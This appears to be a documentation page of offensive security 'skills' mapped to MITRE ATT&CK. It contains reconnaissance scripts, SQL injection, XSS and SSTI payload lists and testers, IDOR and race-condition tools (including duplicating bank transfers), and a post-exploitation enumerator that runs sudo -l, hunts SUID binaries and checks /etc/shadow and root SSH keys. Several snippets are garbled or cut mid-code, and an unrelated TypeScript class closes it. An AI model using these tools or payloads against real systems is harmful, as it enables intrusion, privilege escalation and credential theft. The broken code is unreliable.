    **Skill ID:** `recon-subdomain-enum`
    **MITRE ATT&CK:** T1596 — Search Open Technical Databases

    
      ::field{name="target" type="string"}
      Required — Target root domain for enumeration.
      ::

      ::field{name="passive_only" type="boolean"}
      Default `true` — Use only passive sources, no active DNS bruteforcing.
      ::

      ::field{name="resolvers" type="string[]"}
      Default `['8.8.8.8','1.1.1.1']` — DNS resolvers to use.
      ::

      ::field{name="output_format" type="string"}
      Default `json` — Output format: json, csv, txt.
      ::
    

    ::code-group
    ```bash [subdomain-enum.sh]
    #!/bin/bash
    # Comprehensive Subdomain Enumeration
    # Authorization: REQUIRED
    # Usage: ./subdomain-enum.sh <target-domain>

    set -euo pipefail

    TARGET="${1:?Usage: $0 <target-domain>}"
    TIMESTAMP=$(date -u +%Y%m%d_%H%M%S)
    OUTPUT_DIR="./recon/${TARGET}/${TIMESTAMP}"
    mkdir -p "$OUTPUT_DIR"

    echo "============================================"
    echo " Subdomain Enumeration — $TARGET"
    echo " Started: $(date -u)"
    echo " Output: $OUTPUT_DIR"
    echo "============================================"

    # 1. Certificate Transparency
    echo "[+] Querying crt.sh..."
    curl -s "https://crt.sh/?q=%.${TARGET}&output=json" | \
      jq -r '.[].name_value' 2>/dev/null | \
      sed 's/\*\.//g' | sort -u > "$OUTPUT_DIR/crtsh.txt"
    echo "    Found: $(wc -l < "$OUTPUT_DIR/crtsh.txt") domains"

    # 2. Subfinder
    echo "[+] Running subfinder..."
    subfinder -d "$TARGET" -silent -all -o "$OUTPUT_DIR/subfinder.txt" 2>/dev/null
    echo "    Found: $(wc -l < "$OUTPUT_DIR/subfinder.txt") domains"

    # 3. Amass (passive)
    echo "[+] Running amass passive enum..."
    amass enum -passive -d "$TARGET" -o "$OUTPUT_DIR/amass.txt" 2>/dev/null
    echo "    Found: $(wc -l < "$OUTPUT_DIR/amass.txt") domains"

    # 4. Assetfinder
    echo "[+] Running assetfinder..."
    assetfinder --subs-only "$TARGET" > "$OUTPUT_DIR/assetfinder.txt" 2>/dev/null
    echo "    Found: $(wc -l < "$OUTPUT_DIR/assetfinder.txt") domains"

    # 5. Findomain
    echo "[+] Running findomain..."
    findomain -t "$TARGET" -u "$OUTPUT_DIR/findomain.txt" 2>/dev/null
    echo "    Found: $(wc -l < "$OUTPUT_DIR/findomain.txt") domains"

    # Merge and deduplicate
    echo "[+] Merging and deduplicating..."
    cat "$OUTPUT_DIR"/*.txt | grep -E "\.${TARGET}$" | sort -u > "$OUTPUT_DIR/all-subdomains.txt"
    TOTAL=$(wc -l < "$OUTPUT_DIR/all-subdomains.txt")
    echo "[✓] Total unique subdomains: $TOTAL"

    # 6. DNS Resolution
    echo "[+] Resolving DNS with dnsx..."
    dnsx -l "$OUTPUT_DIR/all-subdomains.txt" -a -aaaa -cname -resp -silent \
      -o "$OUTPUT_DIR/resolved.txt" 2>/dev/null
    echo "    Resolved: $(wc -l < "$OUTPUT_DIR/resolved.txt") domains"

    # 7. HTTP Probing
    echo "[+] Probing live HTTP hosts..."
    httpx -l "$OUTPUT_DIR/all-subdomains.txt" -sc -cl -ct -title \
      -tech-detect -follow-redirects -silent \
      -o "$OUTPUT_DIR/live-hosts.txt" 2>/dev/null
    echo "    Live hosts: $(wc -l < "$OUTPUT_DIR/live-hosts.txt")"

    # 8. Screenshot
    echo "[+] Taking screenshots of live hosts..."
    cat "$OUTPUT_DIR/live-hosts.txt" | awk '{print $1}' | \
      gowitness file -f - -P "$OUTPUT_DIR/screenshots/" 2>/dev/null

    echo "============================================"
    echo " Enumeration Complete"
    echo " Total Subdomains: $TOTAL"
    echo " Results: $OUTPUT_DIR"
    echo "============================================"
    ```

    ```python [osint_aggregator.py]
    """
    OSINT Aggregator — Multi-source intelligence collection
    Authorization REQUIRED before use.
    """

    import asyncio
    import aiohttp
    import json
    import sys
    from dataclasses import dataclass, field
    from datetime import datetime, timezone
    from typing import Optional

    @dataclass
    class OSINTReport:
        target: str
        timestamp: str = field(
            default_factory=lambda: datetime.now(timezone.utc).isoformat()
        )
        subdomains: list[str] = field(default_factory=list)
        emails: list[str] = field(default_factory=list)
        ip_addresses: list[str] = field(default_factory=list)
        technologies: list[str] = field(default_factory=list)
        dns_records: dict[str, list[str]] = field(default_factory=dict)
        whois: Optional[dict] = None
        certificates: list[dict] = field(default_factory=list)
        social_media: list[dict] = field(default_factory=list)
        metadata: dict = field(default_factory=dict)

    class OSINTCollector:
        def __init__(self, target: str, timeout: int = 30):
            self.target = target
            self.timeout = aiohttp.ClientTimeout(total=timeout)
            self.report = OSINTReport(target=target)

        async def _fetch_json(
            self, session: aiohttp.ClientSession, url: str
        ) -> Optional[list | dict]:
            try:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        return await resp.json(content_type=None)
            except Exception as e:
                print(f"[!] Error fetching {url}: {e}")
            return None

        async def collect_crtsh(self, session: aiohttp.ClientSession):
            """Certificate Transparency logs via crt.sh"""
            print("[+] Collecting crt.sh data...")
            data = await self._fetch_json(
                session,
                f"https://crt.sh/?q=%.{self.target}&output=json"
            )
            if data:
                subs = set()
                for entry in data:
                    for name in entry.get("name_value", "").split("\n"):
                        name = name.strip().lstrip("*.")
                        if name.endswith(self.target):
                            subs.add(name)
                self.report.subdomains.extend(subs)
                self.report.certificates.extend([
                    {
                        "issuer": e.get("issuer_name"),
                        "not_before": e.get("not_before"),
                        "not_after": e.get("not_after"),
                        "common_name": e.get("common_name"),
                    }
                    for e in data[:50]
                ])

        async def collect_dns(self, session: aiohttp.ClientSession):
            """DNS records via Google DNS-over-HTTPS"""
            print("[+] Collecting DNS records...")
            record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "SRV"]
            for rtype in record_types:
                data = await self._fetch_json(
                    session,
                    f"https://dns.google/resolve?name={self.target}&type={rtype}"
                )
                if data and "Answer" in data:
                    records = [a["data"] for a in data["Answer"]]
                    self.report.dns_records[rtype] = records
                    if rtype == "A":
                        self.report.ip_addresses.extend(records)

        async def collect_securitytrails(self, session: aiohttp.ClientSession):
            """Historical DNS and subdomain data"""
            print("[+] Checking SecurityTrails (passive)...")
            # Note: requires API key for full access
            pass

        async def collect_shodan(self, session: aiohttp.ClientSession):
            """Shodan host intelligence (passive)"""
            print("[+] Checking Shodan (passive)...")
            data = await self._fetch_json(
                session,
                f"https://internetdb.shodan.io/{self.target}"
            )
            if data:
                self.report.metadata["shodan"] = data

        async def run(self) -> OSINTReport:
            print(f"[*] Starting OSINT collection for: {self.target}")
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                await asyncio.gather(
                    self.collect_crtsh(session),
                    self.collect_dns(session),
                    self.collect_securitytrails(session),
                    self.collect_shodan(session),
                )
            # Deduplicate
            self.report.subdomains = sorted(set(self.report.subdomains))
            self.report.ip_addresses = sorted(set(self.report.ip_addresses))
            print(f"[✓] Collection complete: {len(self.report.subdomains)} subdomains found")
            return self.report

    if __name__ == "__main__":
        target = sys.argv[1] if len(sys.argv) > 1 else "example.com"
        report = asyncio.run(OSINTCollector(target).run())
        print(json.dumps(report.__dict__, indent=2, default=str))
    ```

    :::accordion-item{icon="i-lucide-fingerprint" label="2. Technology Fingerprinting"}
    **Skill ID:** `recon-tech-fingerprint`
    **MITRE ATT&CK:** T1592 — Gather Victim Host Information

    Identify web technologies, frameworks, CMS platforms, WAFs, CDNs, and server configurations through passive and active fingerprinting.

    ```python [tech_fingerprint.py]
    """
    Technology Fingerprinting Engine
    Identifies web stack, WAF, CDN, and framework versions.
    Authorization REQUIRED.
    """

    import re
    import requests
    from dataclasses import dataclass, field

    @dataclass
    class TechFingerprint:
        url: str
        server: str = ""
        powered_by: str = ""
        framework: str = ""
        cms: str = ""
        waf: str = ""
        cdn: str = ""
        languages: list[str] = field(default_factory=list)
        javascript_libraries: list[str] = field(default_factory=list)
        headers: dict[str, str] = field(default_factory=dict)
        cookies: list[str] = field(default_factory=list)
        meta_tags: dict[str, str] = field(default_factory=dict)

    class TechDetector:
        WAF_SIGNATURES = {
            "cloudflare": ["cf-ray", "cf-cache-status", "__cfduid"],
            "aws-waf": ["x-amzn-requestid", "x-amz-cf-id"],
            "akamai": ["x-akamai-transformed", "akamai-origin-hop"],
            "sucuri": ["x-sucuri-id", "x-sucuri-cache"],
            "imperva": ["x-iinfo", "visid_incap"],
            "f5-bigip": ["x-wa-info", "bigipserver"],
            "modsecurity": ["mod_security", "modsecurity"],
        }

        CMS_SIGNATURES = {
            "wordpress": ["/wp-content/", "/wp-includes/", "wp-json"],
            "drupal": ["drupal.js", "sites/default/files", "drupal.org"],
            "joomla": ["/media/jui/", "joomla!", "/administrator/"],
            "shopify": ["cdn.shopify.com", "shopify.com/s/"],
            "magento": ["/skin/frontend/", "mage/cookies.js"],
            "ghost": ["ghost.org", "ghost-url"],
        }

        FRAMEWORK_SIGNATURES = {
            "react": ["react", "_reactRootContainer", "data-reactroot"],
            "vue": ["vue.js", "__vue__", "data-v-"],
            "angular": ["ng-version", "ng-app", "angular.js"],
            "next.js": ["__next", "_next/static", "next-router"],
            "nuxt": ["__nuxt", "_nuxt/", "nuxt.js"],
            "laravel": ["laravel_session", "csrf-token"],
            "django": ["csrfmiddlewaretoken", "django"],
            "rails": ["_rails", "X-Request-Id", "turbolinks"],
            "express": ["x-powered-by: express"],
            "flask": ["werkzeug", "flask"],
            "spring": ["jsessionid", "x-application-context"],
            "asp.net": ["x-aspnet-version", "__viewstate", "asp.net"],
        }

        def __init__(self, timeout: int = 10):
            self.session = requests.Session()
            self.session.headers.update({
                "User-Agent": "TechDetector/1.0 (Authorized Security Assessment)"
            })
            self.timeout = timeout

        def scan(self, url: str) -> TechFingerprint:
            fp = TechFingerprint(url=url)
            try:
                resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
                headers_lower = {k.lower(): v for k, v in resp.headers.items()}
                body = resp.text.lower()

                fp.headers = dict(resp.headers)
                fp.server = headers_lower.get("server", "")
                fp.powered_by = headers_lower.get("x-powered-by", "")
                fp.cookies = [c.name for c in resp.cookies]

                # WAF Detection
                for waf_name, sigs in self.WAF_SIGNATURES.items():
                    for sig in sigs:
                        if sig in headers_lower or sig in body or sig in str(resp.cookies):
                            fp.waf = waf_name
                            break

                # CMS Detection
                for cms_name, sigs in self.CMS_SIGNATURES.items():
                    for sig in sigs:
                        if sig in body:
                            fp.cms = cms_name
                            break

                # Framework Detection
                for fw_name, sigs in self.FRAMEWORK_SIGNATURES.items():
                    for sig in sigs:
                        if sig.lower() in body or sig.lower() in str(headers_lower):
                            fp.framework = fw_name
                            break

                # Meta tag extraction
                meta_pattern = r'<meta\s+(?:name|property)=["\']([^"\']+)["\']\s+content=["\']([^"\']+)["\']'
                for name, content in re.findall(meta_pattern, body):
                    fp.meta_tags[name] = content

            except requests.RequestException as e:
                fp.meta_tags["error"] = str(e)

            return fp
    ```

    ```python [wayback_miner.py]
    """
    Wayback Machine URL Miner
    Discovers historical endpoints and parameters.
    Authorization REQUIRED.
    """

    import asyncio
    import aiohttp
    from urllib.parse import urlparse, parse_qs

    class WaybackMiner:
        def __init__(self, target: str):
            self.target = target
            self.urls: list[str] = []
            self.parameters: set[str] = set()
            self.endpoints: set[str] = set()
            self.interesting_extensions = {
                ".php", ".asp", ".aspx", ".jsp", ".json", ".xml",
                ".conf", ".env", ".bak", ".sql", ".log", ".yml",
                ".yaml", ".ini", ".cfg", ".txt", ".zip", ".tar.gz"
            }

        async def fetch_urls(self) -> list[str]:
            url = (
                f"https://web.archive.org/cdx/search/cdx"
                f"?url={self.target}/*&output=json&fl=original&collapse=urlkey"
            )
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        self.urls = [row[0] for row in data[1:]]
            return self.urls

        def extract_parameters(self) -> set[str]:
            for url in self.urls:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                self.parameters.update(params.keys())
            return self.parameters

        def extract_endpoints(self) -> set[str]:
            for url in self.urls:
                parsed = urlparse(url)
                self.endpoints.add(parsed.path)
            return self.endpoints

        def find_interesting_files(self) -> list[str]:
            interesting = []
            for url in self.urls:
                parsed = urlparse(url)
                for ext in self.interesting_extensions:
                    if parsed.path.lower().endswith(ext):
                        interesting.append(url)
                        break
            return sorted(set(interesting))

        async def run(self) -> dict:
            await self.fetch_urls()
            return {
                "target": self.target,
                "total_urls": len(self.urls),
                "unique_parameters": sorted(self.extract_parameters()),
                "unique_endpoints_count": len(self.extract_endpoints()),
                "interesting_files": self.find_interesting_files(),
            }
    ```

    ```python [sqli_tester.py]
    """
    SQL Injection Detection & Testing
    Supports error-based, blind boolean, blind time-based, and UNION-based techniques.
    Authorization REQUIRED.
    """

    import requests
    import time
    import re
    from dataclasses import dataclass, field
    from enum import Enum
    from typing import Optional
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    class SQLiType(Enum):
        ERROR_BASED = "error-based"
        BOOLEAN_BLIND = "boolean-blind"
        TIME_BLIND = "time-blind"
        UNION_BASED = "union-based"
        STACKED = "stacked-queries"

    @dataclass
    class SQLiFinding:
        url: str
        parameter: str
        sqli_type: SQLiType
        payload: str
        evidence: str
        dbms: str = "unknown"
        severity: str = "critical"
        cwe: str = "CWE-89"

    class SQLiTester:
        ERROR_SIGNATURES = {
            "mysql": [
                "you have an error in your sql syntax",
                "warning: mysql_", "unclosed quotation mark",
                "mysql_num_rows()", "mysql_fetch",
                "corresponding to your mysql server version",
            ],
            "postgresql": [
                "pg_query()", "pg_exec()", "unterminated quoted string",
                "postgresql", "pgsql", "error: syntax error at or near",
            ],
            "mssql": [
                "microsoft ole db provider for sql server",
                "unclosed quotation mark after the character string",
                "microsoft sql server", "[sqlserver]", "odbc sql server",
            ],
            "oracle": [
                "ora-01756", "ora-00933", "oracle error",
                "quoted string not properly terminated", "sql command not properly ended",
            ],
            "sqlite": [
                "sqlite3.operationalerror", "unrecognized token",
                "sqlite_error", "sqlite.exception",
            ],

            "'", "''", '"', '`',
            "' OR '1'='1", "' OR '1'='1'--",
            "1' ORDER BY 1--", "1' ORDER BY 100--",
            "' UNION SELECT NULL--",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "1; WAITFOR DELAY '0:0:5'--",
            "extractvalue(1,concat(0x7e,version()))",
        ]

        BOOLEAN_PAYLOADS = [
            ("' AND '1'='1'--", "' AND '1'='2'--"),
            ("' AND 1=1--", "' AND 1=2--"),
            ("' OR 1=1--", "' OR 1=2--"),
            ("1 AND 1=1", "1 AND 1=2"),
        ]

        TIME_PAYLOADS = {
            "mysql": "' AND SLEEP({delay})--",
            "postgresql": "'; SELECT pg_sleep({delay})--",
            "mssql": "'; WAITFOR DELAY '0:0:{delay}'--",
            "sqlite": "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({delay}00000000/2))))--",
        }

            self.session = requests.Session()
            self.session.headers.update({
                "User-Agent": "SQLiTester/1.0 (Authorized Assessment)"
            })
            self.timeout = timeout
            self.findings: list[SQLiFinding] = []

        def test_error_based(self, url: str, params: dict) -> list[SQLiFinding]:
            for param in params:
                for payload in self.ERROR_PAYLOADS:
                    test_params = params.copy()
                    test_params[param] = payload
                    try:
                        resp = self.session.get(url, params=test_params, timeout=self.timeout)
                        body_lower = resp.text.lower()
                        for dbms, signatures in self.ERROR_SIGNATURES.items():
                            for sig in signatures:
                                if sig in body_lower:
                                    finding = SQLiFinding(
                                        url=url, parameter=param,
                                        sqli_type=SQLiType.ERROR_BASED,
                                        payload=payload, evidence=sig, dbms=dbms
                                    )
                                    self.findings.append(finding)
                                    return self.findings
                    except requests.RequestException:
                        continue
            return self.findings

        def test_boolean_blind(self, url: str, params: dict) -> list[SQLiFinding]:
            baseline = self.session.get(url, params=params, timeout=self.timeout)
            baseline_len = len(baseline.text)

            for param in params:
                for true_payload, false_payload in self.BOOLEAN_PAYLOADS:
                    test_true = params.copy()
                    test_true[param] = true_payload
                    test_false = params.copy()
                    test_false[param] = false_payload
                    try:
                        resp_true = self.session.get(url, params=test_true, timeout=self.timeout)
                        resp_false = self.session.get(url, params=test_false, timeout=self.timeout)
                        len_diff = abs(len(resp_true.text) - len(resp_false.text))
                        if len_diff > 50 and abs(len(resp_true.text) - baseline_len) < 100:
                            self.findings.append(SQLiFinding(
                                url=url, parameter=param,
                                sqli_type=SQLiType.BOOLEAN_BLIND,
                                payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                                evidence=f"Response length diff: {len_diff}"
                            ))
                            break
                    except requests.RequestException:
                        continue
            return self.findings

        def test_time_blind(self, url: str, params: dict, delay: int = 5) -> list[SQLiFinding]:
            for param in params:
                for dbms, payload_template in self.TIME_PAYLOADS.items():
                    payload = payload_template.format(delay=delay)
                    test_params = params.copy()
                    test_params[param] = payload
                    try:
                        start = time.time()
                        self.session.get(url, params=test_params, timeout=delay + 10)
                        elapsed = time.time() - start
                        if elapsed >= delay - 0.5:
                            self.findings.append(SQLiFinding(
                                url=url, parameter=param,
                                sqli_type=SQLiType.TIME_BLIND,
                                payload=payload,
                                evidence=f"Response delayed by {elapsed:.1f}s",
                                dbms=dbms
                            ))
                            break
                    except requests.Timeout:
                        self.findings.append(SQLiFinding(
                            url=url, parameter=param,
                            sqli_type=SQLiType.TIME_BLIND,
                            payload=payload,
                            evidence="Request timed out (likely vulnerable)",
                            dbms=dbms
                        ))
                        break
                    except requests.RequestException:
                        continue
            return self.findings
    ```

    ```python [xss_scanner.py]
    """
    Cross-Site Scripting (XSS) Scanner
    Detects Reflected, Stored, and DOM-based XSS vulnerabilities.
    Authorization REQUIRED.
    """

    import requests
    import re
    from dataclasses import dataclass
    from enum import Enum
    from typing import Optional
    from html import escape
    from urllib.parse import quote

    class XSSType(Enum):
        REFLECTED = "reflected"
        STORED = "stored"
        DOM = "dom-based"

    @dataclass
    class XSSFinding:
        url: str
        parameter: str
        xss_type: XSSType
        payload: str
        context: str
        severity: str = "high"
        cwe: str = "CWE-79"

    class XSSScanner:
        REFLECTION_PAYLOADS = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "'-alert('XSS')-'",
            '<img src=x onerror=alert("XSS")>',
            '"><img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<body onload=alert("XSS")>',
            "javascript:alert('XSS')",
            '{{constructor.constructor("return this")().alert("XSS")}}',
        ]

        CONTEXT_PAYLOADS = {
            "html_tag": [
                '<img src=x onerror=alert(1)>',
                '<svg/onload=alert(1)>',
                '<details open ontoggle=alert(1)>',
            ],
            "html_attribute": [
                '" onmouseover="alert(1)',
                "' onfocus='alert(1)' autofocus='",
                '" autofocus onfocus="alert(1)',
            ],
            "javascript": [
                "'-alert(1)-'",
                "';alert(1)//",
                "\\';alert(1)//",
            ],
            "template": [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "{{constructor.constructor('return this')().alert(1)}}",
            ],
        }

        DOM_SINKS = [
            "document.write(", "document.writeln(",
            ".innerHTML=", ".outerHTML=",
            "eval(", "setTimeout(", "setInterval(",
            "document.location=", "window.location=",
            ".src=", ".href=", ".action=",
        ]

        DOM_SOURCES = [
            "document.URL", "document.documentURI",
            "document.referrer", "location.href",
            "location.search", "location.hash",
            "window.name", "document.cookie",
        ]

        def __init__(self, timeout: int = 10):
            self.session = requests.Session()
            self.timeout = timeout
            self.findings: list[XSSFinding] = []

        def _detect_reflection_context(self, body: str, canary: str) -> Optional[str]:
            if canary not in body:
                return None
            idx = body.find(canary)
            surrounding = body[max(0, idx - 50):idx + len(canary) + 50]
            if re.search(r'<script[^>]*>.*' + re.escape(canary), surrounding, re.I):
                return "javascript"
            if re.search(r'["\'][^"\']*' + re.escape(canary), surrounding):
                return "html_attribute"
            if re.search(r'{{.*' + re.escape(canary), surrounding):
                return "template"
            return "html_tag"

        def scan_reflected(self, url: str, params: dict) -> list[XSSFinding]:
            canary = "xSs7eSt"
            for param in params:
                test_params = params.copy()
                test_params[param] = canary
                try:
                    resp = self.session.get(url, params=test_params, timeout=self.timeout)
                    context = self._detect_reflection_context(resp.text, canary)
                    if context:
                        payloads = self.CONTEXT_PAYLOADS.get(context, self.REFLECTION_PAYLOADS)
                        for payload in payloads:
                            test_params[param] = payload
                            resp2 = self.session.get(url, params=test_params, timeout=self.timeout)
                            if payload in resp2.text:
                                self.findings.append(XSSFinding(
                                    url=url, parameter=param,
                                    xss_type=XSSType.REFLECTED,
                                    payload=payload, context=context,
                                ))
                                break
                except requests.RequestException:
                    continue
            return self.findings

        def scan_dom_based(self, url: str) -> list[XSSFinding]:
            try:
                resp = self.session.get(url, timeout=self.timeout)
                scripts = re.findall(r'<script[^>]*>(.*?)</script>', resp.text, re.S | re.I)
                for script in scripts:
                    for sink in self.DOM_SINKS:
                        if sink in script:
                            for source in self.DOM_SOURCES:
                                if source in script:
                                    self.findings.append(XSSFinding(
                                        url=url, parameter="DOM",
                                        xss_type=XSSType.DOM,
                                        payload=f"Sink: {sink} | Source: {source}",
                                        context="javascript",
                                    ))
            except requests.RequestException:
                pass
            return self.findings
    ```

    ```python [idor_tester.py]
    Insecure Direct Object Reference (IDOR) Tester
    Tests for horizontal and vertical privilege escalation.
    Authorization REQUIRED.
    """

    import requests
    from dataclasses import dataclass
    from typing import Optional
    from itertools import product

    @dataclass
    class IDORFinding:
        url: str
        method: str
        original_id: str
        tested_id: str
        status_code: int
        evidence: str
        escalation_type: str  # horizontal or vertical

    class IDORTester:
        def __init__(self):
            self.session_user_a = requests.Session()
            self.session_user_b = requests.Session()
            self.findings: list[IDORFinding] = []

        def configure_sessions(
            self,
            user_a_token: str,
            user_b_token: str,
            header_name: str = "Authorization",
            prefix: str = "Bearer "
        ):
            self.session_user_a.headers.update({header_name: f"{prefix}{user_a_token}"})
            self.session_user_b.headers.update({header_name: f"{prefix}{user_b_token}"})

        def test_horizontal_idor(
            self,
            url_template: str,
            user_a_ids: list[str],
            user_b_ids: list[str],
            method: str = "GET"
        ) -> list[IDORFinding]:
            """Test if User A can access User B's resources."""
            for target_id in user_b_ids:
                url = url_template.format(id=target_id)
                try:
                    resp = getattr(self.session_user_a, method.lower())(url, timeout=10)
                    if resp.status_code == 200:
                        self.findings.append(IDORFinding(
                            url=url, method=method,
                            original_id=user_a_ids[0],
                            tested_id=target_id,
                            status_code=resp.status_code,
                            evidence=f"User A accessed User B resource: {resp.text[:200]}",
                            escalation_type="horizontal"
                        ))
                except requests.RequestException:
                    continue
            return self.findings

        def test_id_enumeration(
            self,
            url_template: str,
            start_id: int = 1,
            end_id: int = 100,
            method: str = "GET"
        ) -> list[IDORFinding]:

            for test_id in range(start_id, end_id + 1):
                url = url_template.format(id=test_id)

                            url=url, method=method,

                            escalation_type="horizontal"
                        ))
                except requests.RequestException:
                    continue
            return self.findings

            self,
            url: str,
            params: dict,
            tamper_param: str,
            test_values: list[str],
            method: str = "GET"
        ) -> list[IDORFinding]:
            """Test parameter value manipulation for access control bypass."""
            for value in test_values:
                test_params = params.copy()
                test_params[tamper_param] = value
                try:
                    if method.upper() == "GET":
                        resp = self.session_user_a.get(url, params=test_params, timeout=10)
                    else:
                        resp = self.session_user_a.post(url, json=test_params, timeout=10)
    ```

    ```python [race_tester.py]
    """
    Race Condition Tester
    Tests for TOCTOU vulnerabilities using concurrent requests.
    Authorization REQUIRED.
    """

    import asyncio
    import aiohttp
    import time
    from dataclasses import dataclass

    @dataclass
    class RaceResult:
        total_requests: int
        successful: int
        failed: int
        responses: list[dict]
        elapsed: float
        potential_race: bool

    class RaceConditionTester:
        def __init__(self, concurrency: int = 20):
            self.concurrency = concurrency

        async def _send_request(
            self, session: aiohttp.ClientSession,
            method: str, url: str,
            headers: dict = None, data: dict = None,
            request_id: int = 0
        ) -> dict:
            try:
                start = time.monotonic()
                async with session.request(method, url, headers=headers, json=data) as resp:
                    body = await resp.text()
                    elapsed = time.monotonic() - start
                    return {
                        "id": request_id,
                        "status": resp.status,
                        "length": len(body),
                        "elapsed": round(elapsed, 3),
                        "body_preview": body[:200],
                    }
            except Exception as e:
                return {"id": request_id, "status": 0, "error": str(e)}

        async def test_race(
            self, method: str, url: str,
            headers: dict = None, data: dict = None,
            count: int = None
        ) -> RaceResult:
            count = count or self.concurrency
            start = time.monotonic()

            async with aiohttp.ClientSession() as session:
                tasks = [
                    self._send_request(session, method, url, headers, data, i)
                    for i in range(count)
                ]
                # Fire all requests simultaneously
                responses = await asyncio.gather(*tasks)

            elapsed = time.monotonic() - start
            successful = [r for r in responses if r.get("status") in [200, 201, 302]]
            failed = [r for r in responses if r.get("status") not in [200, 201, 302]]

            # Detect potential race condition
            status_codes = set(r.get("status") for r in responses)
            body_lengths = set(r.get("length") for r in responses if "length" in r)
            potential = len(successful) > 1 and (len(status_codes) > 1 or len(body_lengths) > 1)

            return RaceResult(
                total_requests=count,
                successful=len(successful),
                failed=len(failed),
                responses=responses,
                elapsed=round(elapsed, 3),
                potential_race=potential,
            )

        async def test_coupon_race(
            self, url: str, coupon_code: str,
            auth_token: str, count: int = 30
        ) -> RaceResult:
            """Test if a coupon/discount can be applied multiple times."""
            headers = {"Authorization": f"Bearer {auth_token}"}
            data = {"coupon": coupon_code}
            return await self.test_race("POST", url, headers, data, count)

        async def test_transfer_race(
            self, url: str, auth_token: str,
            amount: float, recipient: str, count: int = 30
        ) -> RaceResult:
            """Test if a bank transfer can be duplicated via race condition."""
            headers = {"Authorization": f"Bearer {auth_token}"}
            data = {"amount": amount, "to": recipient}
    ```

    ```python [ssti_detector.py]
            ],
            "erb": [
                "<%= system('id') %>",
                "<%= `id` %>",
            ],
        }

        def __init__(self, timeout: int = 10):
            self.session = requests.Session()
            self.timeout = timeout
            self.findings: list[SSTIFinding] = []

        def detect(self, url: str, params: dict) -> list[SSTIFinding]:
            for param in params:
                for payload, expected, engines in self.DETECTION_PAYLOADS:
                    test_params = params.copy()
                    test_params[param] = payload
                    try:

                            self.findings.append(SSTIFinding(
                                url=url, parameter=param,
                                engine=engine, payload=payload,
                                evidence=f"Expected '{expected}' found in response",
                            ))
                            break
                    except requests.RequestException:
                        continue
            return self.findings
    ```

    ```python [post_exploitation.py]
    AUTHORIZED RED TEAM OPERATIONS ONLY.
    """

    import subprocess
    import platform
    import json
    from dataclasses import dataclass, field
    from typing import Optional

    @dataclass
    class SystemInfo:
        hostname: str = ""
        os_name: str = ""
        os_version: str = ""
        architecture: str = ""
        domain: str = ""
        current_user: str = ""
        privileges: list[str] = field(default_factory=list)

        av_products: list[str] = field(default_factory=list)
        interesting_files: list[str] = field(default_factory=list)

    class PostExploitEnum:
        def __init__(self):
            self.system = platform.system().lower()
            self.info = SystemInfo()

        def _run_cmd(self, cmd: str, shell: bool = True) -> str:
            try:
                result = subprocess.run(
                    cmd, shell=shell, capture_output=True,
                    text=True, timeout=30
                )
                return result.stdout.strip()
            except (subprocess.TimeoutExpired, FileNotFoundError):
                return ""

        def enumerate_system(self) -> SystemInfo:
            self.info.hostname = platform.node()
            self.info.os_name = platform.system()
            self.info.os_version = platform.version()
            self.info.architecture = platform.machine()

            if self.system == "linux":
                self._enum_linux()
            elif self.system == "windows":
                self._enum_windows()

            return self.info

        def _enum_linux(self):
            self.info.current_user = self._run_cmd("whoami")
            self.info.domain = self._run_cmd("hostname -d 2>/dev/null")

            # Privileges
            sudo_check = self._run_cmd("sudo -l 2>/dev/null")
            if sudo_check:
                self.info.privileges.append(f"sudo: {sudo_check[:200]}")

            # SUID binaries
            suid = self._run_cmd("find / -perm -4000 -type f 2>/dev/null | head -20")
            if suid:
                self.info.interesting_files.extend(suid.split('\n'))

            # Network
            netstat = self._run_cmd("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
            if netstat:
                for line in netstat.split('\n')[1:]:
                    parts = line.split()
                    if len(parts) >= 4:
                        self.info.listening_ports.append({
                            "address": parts[3] if len(parts) > 3 else "",
                            "raw": line.strip()
                        })

            # Users
            passwd = self._run_cmd("cat /etc/passwd | grep -v nologin | grep -v false")
            if passwd:
                self.info.local_users = [
                    line.split(':')[0] for line in passwd.split('\n') if line
                ]

            # Crontabs
            crons = self._run_cmd("crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null")
            if crons:
                self.info.scheduled_tasks = crons.split('\n')[:20]

            # Interesting files
            interesting_paths = [
                "/etc/shadow", "/etc/sudoers", "/root/.ssh/id_rsa",
                "/root/.bash_history", "/home/*/.ssh/id_rsa",
                "/var/www/html/wp-config.php", "/etc/mysql/my.cnf",
                "/var/lib/mysql/", "/opt/", "/tmp/",
            ]
            for path in interesting_paths:
                check = self._run_cmd(f"ls -la {path} 2>/dev/null")
                if check:
                    self.info.interesting_files.append(f"{path}: {check[:100]}")

        def _enum_windows(self):
            self.info.current_user = self._run_cmd("whoami")
            self.info.domain = self._run_cmd("echo %USERDOMAIN%")

            # Privileges
            privs = self._run_cmd("whoami /priv")
            if privs:
                for line in privs.split('\n'):
                    if "Enabled" in line:
                        self.info.privileges.append(line.strip())

            # AV
            av = self._run_cmd(
                'wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname /format:list 2>nul'
            )
            if av:
                self.info.av_products = [
                    line.split('=')[1] for line in av.split('\n')
                    if 'displayName=' in line
                ]

            # Users
            users = self._run_cmd("net user")
            if users:
                self.info.local_users = [u.strip() for u in users.split() if u.strip() and u != "---"]

        def to_json(self) -> str:
            return json.dumps(self.info.__dict__, indent=2, default=str)
    ```

    ```ts [service.ts]
    export class UserService {
      constructor(
        private repository: UserRepository,
        private cache?: CacheService
      ) {}

      async getUser(userId: string): Promise<User | null> {
        if (this.cache) {
          const cached = await this.cache.get<User>(`user:${userId}`)
          if (cached) return cached
        }
        const user = await this.repository.findById(userId)
        if (user && this.cache) {

        }
        return user
      }
    }
    ```

